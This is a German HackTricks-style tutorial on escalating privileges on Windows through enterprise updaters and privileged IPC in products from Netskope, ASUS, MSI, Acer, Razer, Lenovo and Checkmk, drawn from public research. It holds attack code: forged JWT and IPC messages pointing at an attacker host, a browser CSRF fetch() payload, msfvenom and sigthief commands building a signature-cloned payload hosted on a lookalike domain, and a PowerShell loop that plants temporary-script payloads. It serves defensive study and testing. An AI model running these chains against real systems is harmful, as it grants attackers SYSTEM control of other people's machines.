# Missbrauch von Enterprise-Auto-Updatern und privilegiertem IPC (z. B. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows-Local-Privilege-Escalation-Ketten, die in Enterprise-Endpoint-Agents und Updatern gefunden wurden, die eine leicht zugängliche IPC-Schnittstelle und einen privilegierten Update-Ablauf bereitstellen. Ein repräsentatives Beispiel ist Netskope Client for Windows < R129 (CVE-2025-0309), bei dem ein Benutzer mit geringen Rechten die Registrierung zu einem vom Angreifer kontrollierten Server umleiten und anschließend ein bösartiges MSI bereitstellen kann, das der SYSTEM-Dienst installiert.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Wichtige Ideen, die sich auf ähnliche Produkte übertragen lassen:
- Das localhost-IPC eines privilegierten Dienstes missbrauchen, um eine erneute Registrierung oder Neukonfiguration auf einem Angreifer-Server zu erzwingen.
- Die Update-Endpunkte des Herstellers implementieren, ein betrügerisches Trusted Root CA bereitstellen und den Updater auf ein bösartiges, „signiertes“ Paket verweisen lassen.
- Schwache Signaturprüfungen (CN-Allow-Lists), optionale Digest-Flags und lax geprüfte MSI-Eigenschaften umgehen.
- Wenn IPC „verschlüsselt“ ist, den Schlüssel/die IV aus weltweit lesbaren Maschinenkennungen in der Registry ableiten.
- Wenn der Dienst Aufrufer anhand des Image-Pfads/Prozessnamens einschränkt, in einen zugelassenen Prozess injizieren oder einen solchen angehalten starten und die eigene DLL über eine minimale Anpassung des Thread-Kontexts laden.

Benutzerdefinierte lokale TCP-Dienste sollten derselben Prüfung ihrer Identität und Eingabegrenzen unterzogen werden, selbst wenn sie eine PIN oder andere Anwendungszugangsdaten erfordern. Ordne den Listener seinem Prozess und dem effektiven Dienstkonto zu und prüfe anschließend die exakt bereitgestellte Binärdatei/Version sowie, ob aufruferkontrollierte Felder längengeprüft werden, bevor sie in feste Puffer kopiert oder zum Erstellen eines untergeordneten Prozessbefehls verwendet werden. [Microsofts Anleitung zu Buffer Overruns](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) erklärt, warum ungeprüfte externe Eingaben in privilegiertem nativen Code gefährlich sind. Ein Loopback-Listener, ein fest codiertes Zugangsdatenfeld oder ein Prozessname allein belegen weder Speicherkorruption noch die Ausführung als SYSTEM; Erreichbarkeit, Autorisierung, Codepfad und Schutzmaßnahmen sind weiterhin separate Bedingungen. Führe routinemäßige Aufzählungen passiv durch, statt einem laufenden Dienst Eingaben in Crash-Länge zu senden.

---
## 1) Registrierung über localhost-IPC zu einem Angreifer-Server erzwingen

Viele Agents enthalten einen User-Mode-UI-Prozess, der über localhost TCP mit einem SYSTEM-Dienst kommuniziert und dabei JSON verwendet.

Bei Netskope beobachtet:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC-Befehls-ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit-Ablauf:
1) Ein JWT-Registrierungstoken erstellen, dessen Claims den Backend-Host steuern (z. B. AddonUrl). alg=None verwenden, damit keine Signatur erforderlich ist.
2) Die IPC-Nachricht mit dem Aufruf des Provisioning-Befehls sowie dem JWT und dem Mandantennamen senden:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Der Dienst beginnt, Anfragen für Enrollment/Config an deinen Rogue Server zu senden, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Hinweise:
- Wenn die Überprüfung des Aufrufers pfad-/namensbasiert erfolgt, sende die Anfrage von einer allow-gelisteten Hersteller-Binärdatei aus (siehe §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Den Update-Kanal kapern, um Code als SYSTEM auszuführen

Sobald der Client mit deinem Server kommuniziert, implementiere die erwarteten Endpunkte und leite ihn zu einem vom Angreifer kontrollierten MSI. Typischer Ablauf:

1) /v2/config/org/clientconfig → Gib eine JSON-Konfiguration mit einem sehr kurzen Updater-Intervall zurück, z. B.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Gibt ein PEM-CA-Zertifikat zurück. Der Service installiert es im Speicher „Trusted Root“ des lokalen Computers.
3) /v2/checkupdate → Stellt Metadaten bereit, die auf eine bösartige MSI und eine gefälschte Version verweisen.

Umgehung gängiger Prüfungen, die in freier Wildbahn vorkommen:
- Signer-CN-Allow-List: Der Service prüft möglicherweise nur, ob der Subject-CN „netSkope Inc“ oder „Netskope, Inc.“ entspricht. Deine Rogue CA kann ein Leaf-Zertifikat mit diesem CN ausstellen und die MSI signieren.
- CERT_DIGEST-Eigenschaft: Füge eine harmlose MSI-Eigenschaft namens CERT_DIGEST hinzu. Bei der Installation wird sie nicht geprüft.
- Optionale Digest-Prüfung: Ein Config-Flag (z. B. check_msi_digest=false) deaktiviert zusätzliche kryptografische Validierung.

Ergebnis: Der SYSTEM-Service installiert deine MSI aus
C:\ProgramData\Netskope\stAgent\data\*.msi
und führt beliebigen Code als NT AUTHORITY\SYSTEM aus.<sup>[[1]](#references)[[2]](#references)</sup>

Lehre aus dem Patch-Bypass: Wenn ein Anbieter darauf reagiert, indem er eine kleine Auswahl „vertrauenswürdiger“ Domains auf eine Allow-List setzt, statt die Update-Quelle kryptografisch zu authentifizieren, solltest du nach anbieterbetriebenen Redirectors oder Reverse Proxies suchen, über die sich der Traffic weiterhin steuern lässt. Im Fall von Netskope zeigte eine öffentliche Folgeanalyse, dass sich eine Allow-List aus der R129-Ära weiterhin über `rproxy.goskope.com` umgehen ließ, das von Angreifern kontrollierte Inhalte eines Azure App Service weiterleitete. Betrachte Hostname-Allow-Lists als Hürde, nicht als Vertrauensgrenze.<sup>[[14]](#references)</sup>

---
## 3) Verschlüsselte IPC-Anfragen fälschen (falls vorhanden)

Ab R127 verpackte Netskope IPC-JSON in ein encryptData-Feld, das wie Base64 aussieht. Reverse Engineering zeigte AES, wobei Key und IV aus Registry-Werten abgeleitet wurden, die für jeden Benutzer lesbar sind:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Angreifer können die Verschlüsselung nachbilden und gültige verschlüsselte Befehle von einem Standardbenutzer aus senden.<sup>[[1]](#references)[[2]](#references)</sup> Allgemeiner Tipp: Wenn ein Agent plötzlich seine IPC „verschlüsselt“, solltest du unter HKLM nach Geräte-IDs, Product-GUIDs und Install-IDs als Schlüsselmaterial suchen.

---
## 4) IPC-Aufrufer-Allow-Lists umgehen (Pfad-/Namensprüfungen)

Einige Services versuchen, den Peer zu authentifizieren, indem sie die PID der TCP-Verbindung ermitteln und den Image-Pfad/-Namen mit einer Allow-List von Anbieter-Binaries unter Program Files vergleichen (z. B. stagentui.exe, bwansvc.exe, epdlp.exe).

Zwei praktische Umgehungsmöglichkeiten:
- DLL injection in einen Prozess auf der Allow-List (z. B. nsdiag.exe) und IPC-Weiterleitung von dort.
- Ein Binary auf der Allow-List im suspendierten Zustand starten und deine Proxy-DLL ohne CreateRemoteThread initialisieren (siehe §5), um die vom Treiber erzwungenen Tamper-Regeln einzuhalten.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-Protection-freundliche Injection: suspendierter Prozess + NtContinue-Patch

Produkte enthalten häufig einen Minifilter-/OB-Callbacks-Treiber (z. B. Stadrv), der gefährliche Rechte aus Handles zu geschützten Prozessen entfernt:
- Prozess: entfernt PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beschränkt auf THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ein zuverlässiger User-Mode-Loader, der diese Einschränkungen berücksichtigt:
1) CreateProcess für ein Anbieter-Binary mit CREATE_SUSPENDED aufrufen.
2) Die weiterhin erlaubten Handles beziehen: PROCESS_VM_WRITE | PROCESS_VM_OPERATION für den Prozess sowie ein Thread-Handle mit THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oder nur THREAD_RESUME, wenn du Code an einem bekannten RIP patchst).
3) ntdll!NtContinue (oder einen anderen früh geladenen, garantiert gemappten Thunk) mit einem kleinen Stub überschreiben, der LoadLibraryW mit dem Pfad deiner DLL aufruft und dann zurückspringt.
4) ResumeThread aufrufen, um den Stub im Prozess auszuführen und deine DLL zu laden.

Da du PROCESS_CREATE_THREAD oder PROCESS_SUSPEND_RESUME nie für einen bereits geschützten Prozess verwendet hast (du hast ihn selbst erstellt), entspricht dies den Richtlinien des Treibers.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktische Tools
- NachoVPN (Netskope-Plugin) automatisiert eine Rogue CA, das Signieren einer bösartigen MSI und die Bereitstellung der benötigten Endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ist ein benutzerdefinierter IPC-Client, der beliebige (optional AES-verschlüsselte) IPC-Nachrichten erstellt und die Injection in einen suspendierten Prozess enthält, um die Anfrage von einem Binary auf der Allow-List auszusenden.<sup>[[4]](#references)</sup>

## 7) Schneller Triage-Workflow für unbekannte Updater-/IPC-Oberflächen

Bei einem neuen Endpoint-Agent oder einer „Helper“-Suite für Motherboards reicht meist ein schneller Workflow aus, um festzustellen, ob es sich um ein vielversprechendes Privesc-Ziel handelt:<sup>[[6]](#references)</sup>

1) Loopback-Listener auflisten und den zugehörigen Anbieter-Prozessen zuordnen:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Potenzielle Named Pipes auflisten:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Registry-gestützte Routing-Daten von pluginbasierten IPC-Servern auslesen:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrahiere zuerst Endpoint-Namen, JSON-Schlüssel und Command-IDs aus dem User-Mode-Client. Gepackte Electron/.NET-Frontends leaken häufig das vollständige Schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Suche nach dem tatsächlichen Vertrauenskriterium, nicht nur nach dem Codepfad, der letztendlich den Prozess startet:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Muster, die Priorität verdienen:
- `CryptQueryObject`/Zertifikatsparsing ohne `WinVerifyTrust` bedeutet meist, dass „Zertifikat vorhanden“ als „Zertifikat vertrauenswürdig“ behandelt wurde. Das ermöglicht das Klonen von Zertifikaten oder andere Tricks mit gefälschten Signaturen.
- Teilstring-/Suffix-Prüfungen für `Origin`, `Referer`, Download-URLs, Prozessnamen oder Signer-CNs sind keine Authentifizierung. `contains(".vendor.com")` ist meist mit vom Angreifer kontrollierten Lookalike-Domains ausnutzbar.
- Wenn die GUI mit niedrigen Berechtigungen entscheidet, „die Datei ist vertrauenswürdig“, und der SYSTEM-Broker dieses Ergebnis lediglich übernimmt, lässt sich die Grenze oft vollständig umgehen, indem die clientseitige DLL/JS gepatcht oder neu implementiert wird (Validierungsteilung nach Razer-Art).
- Wenn der Broker eine Payload nach `%TEMP%`/`C:\Windows\Temp` kopiert und sie anschließend von diesem Pfad aus validiert oder zur Ausführung einplant, teste sofort auf TOCTOU-Austauschfenster und auf benachbarte Plugin-Module, die alternative `ExecuteTask()`-Wrapper mit schwächeren Prüfungen bereitstellen.<sup>[[6]](#references)</sup>

Bei Zielen mit vielen Named Pipes ist PipeViewer eine schnelle Möglichkeit, schwache DACLs und remote erreichbare Pipes zu finden, bevor du das Protokoll im Detail reverse-engineerst.<sup>[[11]](#references)</sup>

Wenn das Ziel Aufrufer nur anhand der PID, des Image-Pfads oder des Prozessnamens authentifiziert, betrachte das eher als Hindernis denn als Sicherheitsgrenze: Eine Injektion in den legitimen Client oder eine Verbindung über einen zugelassenen Prozess reicht oft aus, um die Prüfungen des Servers zu bestehen. Speziell für Named Pipes behandelt [diese Seite über Client-Impersonation und Pipe-Missbrauch](named-pipe-client-impersonation.md) das Grundprinzip ausführlicher.

Untersuche bei einem privilegierten **Cleanup- oder Restore-Broker** neben der Pipe-ACL auch die Vertrauensgrenze für Pfade. Ein Aufrufer mit niedrigeren Berechtigungen kann möglicherweise ein Restore-Ziel auswählen oder ein bereitgestelltes Backup-Artefakt in einem gemeinsam genutzten Verzeichnis umbenennen, selbst wenn die Service-Executable und ihr Installationsverzeichnis geschützt sind. Prüfe separat, ob der Aufrufer den Restore-Befehl aufrufen und die genaue bereitgestellte Eingabe oder den Dateinamen ändern kann, ob der Broker mit einer höher privilegierten Identität läuft und ob der Restore-Vorgang tatsächlich in den ausgewählten geschützten Pfad schreibt. Ein beschreibbares Bereitstellungsverzeichnis oder eine lesbare Pipe allein belegt keinen beliebigen privilegierten Schreibzugriff; die Zielzuordnung und das Verhalten des Service müssen durch eine Codeprüfung oder kontrollierte Tests untersucht werden. Rufe während einer passiven Aufklärung keinen unbekannten Cleanup-Befehl auf, da er Benutzerdateien löschen könnte.

---
## 8) Modulare Add-in-Broker, die nur anhand von Hersteller-Signaturen authentifiziert werden (Lenovo-Vantage-Muster)

Eine neuere Variante, nach der es sich zu suchen lohnt, ist der **signed-client RPC broker**: Ein Lenovo-signierter Desktop-Prozess mit niedrigen Berechtigungen kommuniziert mit einem SYSTEM-Service, und der Service leitet JSON-Befehle an eine Reihe XML-beschriebener Add-ins unter `%ProgramData%` weiter. Sobald Codeausführung **in einem beliebigen akzeptierten signierten Client** erreicht ist, wird jeder Vertrag mit `runas="system"` Teil der Angriffsfläche.<sup>[[15]](#references)</sup>

Wichtige Primitive aus der Lenovo-Vantage-Forschung:
- **Dem Aufrufer vertrauen, weil er vom Hersteller signiert ist**: Forschende erreichten einen authentifizierten Kontext, indem sie eine Lenovo-signierte EXE in ein beschreibbares Verzeichnis kopierten und einen DLL-Side-Load (`profapi.dll`) ermöglichten, sodass beliebiger Code in einem Client ausgeführt wurde, dem der Service bereits vertraute.
- **Angriffsfläche über Manifeste ermitteln**: Add-ins werden unter `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` deklariert; mehrere Verträge laufen als `SYSTEM`. Daher deckt das Auflisten dieser Manifeste oft schneller die tatsächlich privilegierten Aktionen auf, als den Broker selbst zu reverse-engineeren.
- **Fehler in einzelnen Befehlen hinter dem authentifizierten Kanal**: Sobald Forschende im vertrauenswürdigen Client waren, fand öffentliche Forschung Path Traversal und Race Conditions in Update-/Installationsbefehlen, den Missbrauch von Raw SQL in privilegierten Einstellungsdatenbanken sowie auf Teilstrings basierende Prüfungen von Registry-Pfaden, die Schreibzugriffe außerhalb des vorgesehenen Hive ermöglichten.

Nützliche Aufklärung auf einem Ziel:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktische Erkenntnis: Wenn eine Helper-Suite einen Broker bereitstellt, der zuerst den **aufrufenden Prozess** authentifiziert und erst danach Dutzende Plugin-/Add-in-Befehle ausführt, solltest du nicht aufhören, nachdem du die Trust-Prüfung an der Eingangstür umgangen hast. Dump die Manifest-/Vertragstabelle und fuzze jeden Verb mit hohen Berechtigungen einzeln; der authentifizierte Kanal verbirgt normalerweise mehrere Bugs in der zweiten Stufe.

---
## 1) Browser-zu-localhost-CSRF gegen privilegierte HTTP-APIs (ASUS DriverHub)

DriverHub liefert einen HTTP-Dienst im User-Mode (ADU.exe) auf 127.0.0.1:53000 aus, der Browser-Aufrufe erwartet, die von https://driverhub.asus.com stammen. Der Origin-Filter führt für den Origin-Header und für Download-URLs, die über `/asus/v1.0/*` bereitgestellt werden, einfach `string_contains(".asus.com")` aus. Jeder vom Angreifer kontrollierte Host wie `https://driverhub.asus.com.attacker.tld` besteht daher die Prüfung und kann JavaScript-Aufrufe ausführen, die den Zustand ändern.<sup>[[6]](#references)</sup> Weitere Bypass-Muster findest du unter [CSRF-Grundlagen](../../pentesting-web/csrf-cross-site-request-forgery.md).

Praktischer Ablauf:
1) Registriere eine Domain, die `.asus.com` enthält, und hoste dort eine bösartige Webseite.
2) Verwende `fetch` oder XHR, um einen privilegierten Endpunkt (z. B. `Reboot`, `UpdateApp`) auf `http://127.0.0.1:53000` aufzurufen.
3) Sende den vom Handler erwarteten JSON-Body – das gepackte Frontend-JS zeigt das Schema unten.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Sogar die unten gezeigte PowerShell-CLI funktioniert, wenn der Origin-Header auf den vertrauenswürdigen Wert gefälscht wird:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Jeder Browser-Aufruf der Angreifer-Site wird somit zu einem lokalen CSRF-Angriff mit 1 Klick (oder 0 Klicks über `onload`), der einen SYSTEM-Helfer steuert.

---
## 2) Unsichere Code-Signing-Prüfung und Zertifikatsklonen (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige, im JSON-Body definierte ausführbare Dateien herunter und speichert sie zwischen in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Validierung der Download-URL verwendet dieselbe Substring-Logik, daher wird `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert. Nach dem Download prüft ADU.exe lediglich, ob die PE-Datei eine Signatur enthält und der Subject-String mit ASUS übereinstimmt, bevor sie ausgeführt wird – ohne `WinVerifyTrust` und ohne Chain-Validierung.

So lässt sich der Ablauf weaponizen:
1) Erstelle einen Payload (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klone ASUS’ Signatur in den Payload (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hoste `pwn.exe` auf einer ähnlich aussehenden `.asus.com`-Domain und löse UpdateApp über den obigen Browser-CSRF aus.

Da sowohl die Origin- als auch die URL-Filter substring-basiert sind und die Signaturprüfung nur Strings vergleicht, lädt DriverHub die Binärdatei des Angreifers herunter und führt sie mit erhöhten Rechten aus.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU in den Kopier-/Ausführungspfaden des Updaters (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Dienst von MSI Center stellt ein TCP-Protokoll bereit, bei dem jeder Frame aus `4-byte ComponentID || 8-byte CommandID || ASCII arguments` besteht. Die Kernkomponente (Component ID `0f 27 00 00`) enthält `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Der Handler:
1) Kopiert die angegebene ausführbare Datei nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) Prüft die Signatur mit `CS_CommonAPI.EX_CA::Verify` (der Zertifikats-Subject muss „MICRO-STAR INTERNATIONAL CO., LTD.“ entsprechen und `WinVerifyTrust` erfolgreich sein).
3) Erstellt eine geplante Aufgabe, die die temporäre Datei als SYSTEM mit vom Angreifer kontrollierten Argumenten ausführt.

Die kopierte Datei wird zwischen der Prüfung und `ExecuteTask()` nicht gesperrt. Ein Angreifer kann:
- Frame A senden, der auf eine legitime MSI-signierte Binärdatei verweist (dadurch wird die Signaturprüfung bestanden und die Aufgabe eingereiht).
- Mit wiederholten Frame-B-Nachrichten ein Race auslösen, die auf einen bösartigen Payload verweisen und `MSI Center SDK.exe` unmittelbar nach Abschluss der Prüfung überschreiben.

Wenn der Task Scheduler die Aufgabe startet, führt er den überschriebenen Payload als SYSTEM aus, obwohl die ursprüngliche Datei validiert wurde. Für eine zuverlässige Ausnutzung werden zwei Goroutines/Threads verwendet, die `CMD_AutoUpdateSDK` so lange mit Nachrichten fluten, bis das TOCTOU-Fenster getroffen wird.<sup>[[6]](#references)</sup>

---
## 2) Missbrauch benutzerdefinierter SYSTEM-Level-IPC und Impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP-Befehlssätze
- Jedes von `MSI.CentralServer.exe` geladene Plugin/DLL erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert ist. Die ersten 4 Bytes eines Frames wählen die Komponente aus und ermöglichen Angreifern, Befehle an beliebige Module weiterzuleiten.
- Plugins können eigene Task Runner definieren. `Support\API_Support.dll` stellt `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` bereit und ruft `API_Support.EX_Task::ExecuteTask()` direkt **ohne Signaturprüfung** auf – jeder lokale Benutzer kann darauf `C:\Users\<user>\Desktop\payload.exe` verweisen lassen und so deterministisch SYSTEM-Ausführung erreichen.
- Das Mitschneiden von Loopback-Traffic mit Wireshark oder die Instrumentierung der .NET-Binärdateien in dnSpy legt die Component-zu-Befehl-Zuordnung schnell offen; anschließend können eigene Go-/Python-Clients die Frames erneut senden.<sup>[[6]](#references)</sup>

### Named Pipes und Impersonation-Levels von Acer Control Centre
- `ACCSvc.exe` (SYSTEM) stellt `\\.\pipe\treadstone_service_LightMode` bereit. Seine discretionary ACL lässt Remote-Clients zu (z. B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden der Command ID `7` mit einem Dateipfad ruft die Prozessstart-Routine des Dienstes auf.
- Die Client-Bibliothek serialisiert zusammen mit den Argumenten ein magisches Terminator-Byte (113). Dynamische Instrumentierung mit Frida/`TsDotNetLib` (Tipps zur Instrumentierung siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) zeigt, dass der native Handler diesen Wert vor dem Aufruf von `CreateProcessAsUser` einer `SECURITY_IMPERSONATION_LEVEL` und einer Integrity SID zuordnet.
- Wird 113 (`0x71`) durch 114 (`0x72`) ersetzt, gelangt die Ausführung in den generischen Zweig, der das vollständige SYSTEM-Token beibehält und eine High-Integrity-SID (`S-1-16-12288`) setzt. Die gestartete Binärdatei läuft daher uneingeschränkt als SYSTEM, sowohl lokal als auch computerübergreifend.
- In Kombination mit dem offengelegten Installer-Flag (`Setup.exe -nocheck`) lässt sich ACC auch auf Labor-VMs installieren und die Pipe ohne Hardware des Herstellers testen.<sup>[[6]](#references)</sup>

Diese IPC-Schwachstellen zeigen, warum Localhost-Dienste gegenseitige Authentifizierung erzwingen müssen (ALPC-SIDs, `ImpersonationLevel=Impersonation`-Filter, Token-Filterung) und warum alle Hilfsfunktionen zum „Ausführen beliebiger Binärdateien“ dieselben Signaturprüfungen verwenden müssen.

---
## 3) COM/IPC-„Elevator“-Helfer mit schwacher Validierung im User-Mode (Razer Synapse 4)

Razer Synapse 4 fügte ein weiteres nützliches Muster in dieser Kategorie hinzu: Ein Benutzer mit niedrigen Rechten kann einen COM-Helfer über `RzUtility.Elevator` auffordern, einen Prozess zu starten. Die Vertrauensentscheidung wird dabei an eine User-Mode-DLL (`simple_service.dll`) delegiert, anstatt innerhalb der privilegierten Grenze zuverlässig erzwungen zu werden.

Beobachteter Ausnutzungspfad:
- Instanziiere das COM-Objekt `RzUtility.Elevator`.
- Rufe `LaunchProcessNoWait(<path>, "", 1)` auf, um einen Start mit erhöhten Rechten anzufordern.
- Im öffentlichen PoC wird die PE-Signaturprüfung in `simple_service.dll` vor dem Senden der Anfrage deaktiviert, sodass eine beliebige, vom Angreifer ausgewählte ausführbare Datei gestartet werden kann.<sup>[[6]](#references)[[10]](#references)</sup>

Minimale PowerShell-Ausführung:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Allgemeine Erkenntnis: Wenn ihr „Helper“-Suiten reverse-engineert, solltet ihr euch nicht auf localhost TCP oder Named Pipes beschränken. Prüft, ob es COM-Klassen mit Namen wie `Elevator`, `Launcher`, `Updater` oder `Utility` gibt, und verifiziert dann, ob der privilegierte Dienst die Ziel-Binary tatsächlich selbst validiert oder lediglich einem Ergebnis vertraut, das eine patchbare User-Mode-Client-DLL berechnet hat. Dieses Muster gibt es nicht nur bei Razer: Jedes geteilte Design, bei dem der High-Privilege-Broker eine Allow/Deny-Entscheidung von der Low-Privilege-Seite übernimmt, ist eine potenzielle Privesc-Angriffsfläche.


---
## Vorhersehbare Ausführung temporärer Skripte während einer MSI-Reparatur (Checkmk Agent / CVE-2024-0670)

Einige Windows-Agents führen privilegierte Aktionen noch immer aus, indem sie eine temporäre `.cmd`-Datei nach `C:\Windows\Temp` schreiben und als `SYSTEM` ausführen. Ist der Dateiname vorhersehbar und erstellt der Dienst vorhandene Dateien nicht sicher neu, kann ein Benutzer mit niedrigen Rechten die zukünftige temporäre Datei vorab **schreibgeschützt** erstellen und den privilegierten Prozess dazu bringen, vom Angreifer kontrollierten Inhalt statt seines eigenen Skripts auszuführen.

In anfälligen Checkmk-Agent-Builds beobachtet:
- temp-Muster: `cmk_all_<PID>_1.cmd`
- betroffene Branches: `2.0.0`, `2.1.0`, `2.2.0`
- Auslöser: MSI-**Reparatur** des zwischengespeicherten Agent-Pakets<sup>[[8]](#references)[[9]](#references)</sup>

Praktischer Ablauf:
1. Schätzt einen realistischen PID-Bereich anhand aktueller Prozess-IDs oder der PID des laufenden Agents.
2. Schreibt ein kurzes **ASCII**-`.cmd`-Payload (`Set-Content -Encoding Ascii` oder Umleitung über `cmd.exe`; vermeidet UTF-16-Ausgabe aus PowerShell für Batch-Dateien).
3. Verteilt Dateien mit Namen wie `C:\Windows\Temp\cmk_all_<PID>_1.cmd` über den möglichen Bereich und markiert jede Datei als schreibgeschützt.
4. Löst eine Reparatur des zwischengespeicherten MSI aus, damit der privilegierte Dienst versucht, das temporäre Skript neu zu erstellen und es anschließend auszuführen.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Wenn das anfällige Produkt mit Windows Installer installiert wurde, ordne die zufällig wirkende zwischengespeicherte MSI-Datei unter `C:\Windows\Installer` ihrem Produktnamen zu, bevor du die Reparatur auslöst:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Betriebshinweise:
- `qwinsta` ist nützlich, wenn `msiexec /fa` in einer nicht interaktiven WinRM-Shell fehlschlägt und du herausfinden musst, ob eine bestehende Desktop- oder getrennte Sitzung die Reparatur korrekt auslösen kann.<sup>[[7]](#references)</sup>
- Dieses Muster lässt sich auf andere Endpoint-Agents und Updater übertragen, die **temporäre Skripte an allgemein beschreibbaren Speicherorten ablegen und später als SYSTEM ausführen**. Prüfe auf vorhersehbare Namen, fehlende exklusive Erstellung und Reparatur-/Update-Abläufe, die sich bei Bedarf auslösen lassen.

### Interaktive Installer-Reparatur und privilegierte Konsole

PDF24 Creator 11.15.1 veranschaulicht ein separates MSI-Reparaturrisiko: Seine benutzerdefinierte Druckerinstallationsaktion kann während der Reparatur eine sichtbare Konsole mit SYSTEM-Rechten starten. Der Anbieter änderte den MSI-Installer in Version 11.15.2, um dieses Verhalten zu beheben. Eine ältere Produktversion ist lediglich ein Hinweis für die Triage. Prüfe das registrierte oder erreichbare MSI-Paket, ob dieser Benutzer eine Reparatur einleiten kann, ob die anfällige benutzerdefinierte Aktion und die Verzögerung durch die Protokolldatei vorhanden sind und ob ein interaktiver Desktop die Konsole sichtbar machen kann. Für die gemeldete Verzögerung wurde ein Oplock auf `faxPrnInst.log` verwendet; gewöhnliche Schreibberechtigung auf die Datei ist nicht die einzige Zugriffsvoraussetzung. Eine nicht interaktive Shell, ein unzugängliches Paket oder ein gepatchter Installer können die Angriffskette unterbrechen. Dieses Problem hängt nicht von `AlwaysInstallElevated` ab und unterscheidet sich vom Ersetzen eines vorhersehbar benannten temporären Skripts.

---
## Remote-Supply-Chain-Hijacking durch schwache Updater-Validierung (WinGUp / Notepad++)

